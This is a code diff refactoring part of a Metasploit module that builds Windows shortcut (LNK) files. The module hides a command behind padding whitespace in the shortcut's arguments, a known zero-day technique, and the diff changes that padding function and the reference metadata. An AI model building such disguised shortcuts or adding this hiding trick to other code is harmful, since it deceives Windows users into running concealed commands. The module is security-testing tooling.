@@ -2,6 +2,7 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+require 'faker'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::FILEFORMAT
@@ -20,7 +21,7 @@ class MetasploitModule < Msf::Auxiliary
         'License' => MSF_LICENSE,
         'Author' => [ 'Nafiez' ],
         'References' => [
-          ['ZDI', 'ZDI-CAN-25373'],
+          ['ZDI', 'CAN-25373'],
           ['URL', 'https://zeifan.my/Windows-LNK/'],
           ['URL', 'https://gist.github.com/nafiez/1236cc4c808a489e60e2927e0407c8d1'],
           ['URL', 'https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html']
@@ -53,14 +54,12 @@ class MetasploitModule < Msf::Auxiliary
     icon_path = datastore['ICON_PATH']
 
     unless description && !description.empty?
-      require 'faker'
       description = Faker::Lorem.sentence(word_count: 3)
       description ||= 'Shortcut'
     end
 
     unless icon_path && !icon_path.empty?
-      require 'faker'
-      icon_path = File.join('%SystemRoot%\\System32', "#{Faker::File.file_name(ext: 'icon')}.to_s")
+      icon_path = File.join('%SystemRoot%\\System32', Faker::File.file_name(ext: 'icon').to_s)
       icon_path ||= '%SystemRoot%\\System32\\shell32.dll'
     end
 
@@ -90,7 +89,7 @@ class MetasploitModule < Msf::Auxiliary
     data << create_string_data(icon_path)
     data << create_environment_block
 
-    return data
+    data
   end
 
   def create_shell_link_header
@@ -116,7 +115,7 @@ class MetasploitModule < Msf::Auxiliary
     header << [0].pack('V')
     header << [0].pack('V')
 
-    return header
+    header
   end
 
   def create_string_data(str)
@@ -127,7 +126,7 @@ class MetasploitModule < Msf::Auxiliary
     unicode_str = str.encode('UTF-16LE').force_encoding('ASCII-8BIT')
     data << unicode_str
 
-    return data
+    data
   end
 
   def create_command_buffer(command, buffer_size)
@@ -136,16 +135,12 @@ class MetasploitModule < Msf::Auxiliary
     cmd_len = cmd_command.length
     fill_bytes = buffer_size - cmd_len
 
-    if fill_bytes > 0
-      buffer = ' ' * fill_bytes + cmd_command
-    else
-      buffer = cmd_command
-    end
+    buffer = ' ' * fill_bytes + cmd_command
 
     buffer = buffer[0, buffer_size] if buffer.length > buffer_size
     buffer << "\x00"
 
-    return buffer
+    buffer
   end
 
   def create_environment_block
